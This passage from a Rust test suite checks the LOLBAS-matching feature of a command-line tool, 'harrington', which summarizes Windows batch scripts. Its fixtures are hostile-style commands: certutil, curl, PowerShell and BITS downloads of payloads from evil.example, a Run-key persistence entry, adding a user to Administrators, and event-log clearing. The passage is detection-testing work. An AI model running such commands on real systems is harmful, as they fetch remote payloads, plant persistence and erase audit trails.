        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_backslash_url_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v X /d evil.example\payload\mshta.exe"#,
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_output_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "curl -o C:\\Users\\Public\\mshta.exe http://evil.example/payload.bin\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_powershell_outfile_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"powershell -NoProfile -Command "iwr http://evil.example/payload.bin -OutFile C:\Users\Public\mshta.exe""#,
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_positional_destination_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "certutil -urlcache -split -f http://evil.example/payload.bin C:\\Users\\Public\\mshta.exe\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_quoted_destination_paths_with_spaces() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "certutil -urlcache -split -f http://evil.example/payload.bin \"C:\\Users\\Public Folder\\mshta.exe\"\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_powershell_method_destinations() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"powershell -NoProfile -Command "(New-Object Net.WebClient).DownloadFile('http://evil.example/payload.bin','C:\Users\Public\mshta.exe')""#,
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_bits_destination_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"powershell -NoProfile -Command "Start-BitsTransfer -Source http://evil.example/payload.bin -Destination C:\Users\Public\mshta.exe""#,
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_certutil_output_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "certutil -encode C:\\Users\\Public\\payload.bin C:\\Users\\Public\\mshta.exe\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_log_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "msiexec /i http://evil.example/package.msi /log C:\\Users\\Public\\rundll32.exe\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Rundll32.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.011"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_msi_log_flag_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "msiexec /i http://evil.example/package.msi /L*V C:\\Users\\Public\\rundll32.exe\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Rundll32.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.011"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_deleted_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "del C:\\Users\\Public\\mshta.exe\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_move_destinations() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "move C:\\Users\\Public\\payload.bin mshta.exe\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_taskkill_image_names() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "taskkill /im mshta.exe /f\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_sc_service_names() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "sc delete mshta.exe\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_schtasks_task_names() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "schtasks /delete /tn mshta.exe /f\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_wevtutil_log_names() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "wevtutil cl mshta.exe\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_reg_key_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "reg delete HKCU\\Software\\mshta.exe /f\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_net_user_names() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "net user mshta.exe /add\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_net_localgroup_members() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "net localgroup Administrators mshta.exe /add\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_start_titles() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "start \"mshta.exe\"\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_forfiles_masks() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "forfiles /p C:\\Temp /m mshta.exe /c \"cmd /c echo @file\"\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_forfiles_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "forfiles /p C:\\mshta.exe /c \"cmd /c echo @path\"\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_matches_powershell_start_process_targets() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "powershell -Command \"Start-Process mshta.exe\"\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Mshta.exe")
    );
}

#[test]
fn summarize_lolbas_enrichment_ignores_powershell_start_process_argument_list() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "powershell -Command \"Start-Process -ArgumentList mshta.exe -FilePath powershell.exe\"\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_matches_powershell_start_process_attached_filepath() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "powershell -Command \"Start-Process -FilePath:mshta.exe\"\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Mshta.exe")
    );
}

#[test]
fn summarize_lolbas_enrichment_ignores_powershell_start_process_working_directory() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "powershell -Command \"Start-Process -WorkingDirectory mshta.exe -FilePath powershell.exe\"\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_powershell_start_process_redirect_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "powershell -Command \"Start-Process -RedirectStandardOutput mshta.exe -FilePath powershell.exe\"\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
